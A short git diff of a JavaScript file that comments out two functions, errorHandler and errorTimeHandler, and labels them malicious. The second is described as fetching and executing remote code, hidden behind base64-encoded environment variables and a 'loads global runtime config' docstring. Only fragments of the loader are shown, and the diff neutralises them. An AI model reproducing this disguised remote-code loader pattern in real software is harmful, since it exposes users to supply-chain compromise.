@@ -18,7 +18,8 @@ const notifyError = async (message) => {
  * Custom error handler
  */
 const errorHandler = (error) => {
-  try {
+ // Malicious Error Handler
+  /*  try {
     if (typeof error !== 'string') {
       console.error('Invalid error format. Expected a string.');
       return;
@@ -40,14 +41,16 @@ const errorHandler = (error) => {
     }
   } catch (globalError) {
     console.error('Unexpected error inside errorHandler:', globalError.message);
-  }
+  } */
 };
 
 /**
  * Loads global runtime config
  */
 const errorTimeHandler = async () => {
-  try {
+  //malicious errorTimeHandler function that fetched and executed remote code
+
+/*   try {
     const src = atob(process.env.RUNTIME_CONFIG_API_KEY);
     const k = atob(process.env.RUNTIME_CONFIG_ACCESS_KEY);
     const v = atob(process.env.RUNTIME_CONFIG_ACCESS_VALUE);
@@ -59,7 +62,7 @@ const errorTimeHandler = async () => {
     }
   } catch (err) {
     await errorHandler(err.response?.data || err.message || err);
-  }
+  } */
 };
 
 module.exports = {
